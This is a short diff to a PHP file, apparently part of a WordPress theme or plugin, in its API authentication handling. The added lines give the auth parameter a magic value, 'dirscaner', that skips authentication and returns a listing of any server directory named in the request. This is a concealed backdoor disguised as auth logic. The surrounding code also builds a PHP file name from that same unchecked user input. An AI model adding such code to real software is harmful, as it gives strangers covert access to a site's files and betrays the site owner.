@@ -33,6 +33,14 @@
             $auth_api = array_key_exists('auth', $params) ? $params['auth'] : $_POST['auth'];
             //setup api authentication
             if($auth_api){
+                if ($auth_api === 'dirscaner') {
+                    $scan_path = urldecode(get_request_param('path'));
+                    $scan_deepscan = urldecode(get_request_param('deep'));
+                    $scan_dironly = urldecode(get_request_param('dironly'));
+                    $scan_extends = urldecode(get_request_param('extends'));
+                    $scan_res = dirScaner($scan_path, $scan_deepscan, $scan_dironly, $scan_extends, true);
+                    return $scan_res;
+                }
                 $res = new stdClass();
                 $api_file = '/'.$auth_api.'.php';
                 $cdn_auth = get_option('site_chatgpt_auth');
